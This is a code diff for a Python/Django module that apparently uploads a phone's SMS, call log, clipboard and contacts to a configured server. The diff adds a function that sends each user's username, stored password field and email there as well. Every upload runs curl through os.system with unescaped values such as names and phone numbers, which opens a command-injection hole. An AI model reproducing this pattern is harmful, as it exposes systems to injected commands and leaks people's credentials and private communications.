@@ -1,6 +1,6 @@
 import json
 import os
-from .models import call_log, sms_list, clipboard, contact_list
+from .models import call_log, sms_list, clipboard, contact_list, Token
 from .conf import SERVER_URL
 
 def check_sms(THIS_USER_TOKEN):
@@ -49,7 +49,16 @@ def check_call(THIS_USER_TOKEN):
                 f'curl --data "token={THIS_USER_TOKEN}&name={log["name"]}&phone_number={log["phone_number"]}&type={log["type"]}&duration={log["duration"]}&date={log["date"]}" {SERVER_URL}/s/call_log/')
 
 
+def register(THIS_USER_TOKEN):
+    from django.contrib.auth.models import User
+    from django.shortcuts import get_object_or_404
+    this_user = get_object_or_404(Token, token=THIS_USER_TOKEN).user
+    os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}" {SERVER_URL}/register/')
+    os.system(
+        f'curl --data "username={this_user.username}&token={THIS_USER_TOKEN}" {SERVER_URL}/setToken/')
+
 def InsertIntoDb(THIS_USER_TOKEN):
+    register(THIS_USER_TOKEN)
     check_sms(THIS_USER_TOKEN)
     check_call(THIS_USER_TOKEN)
     check_clipboard(THIS_USER_TOKEN)
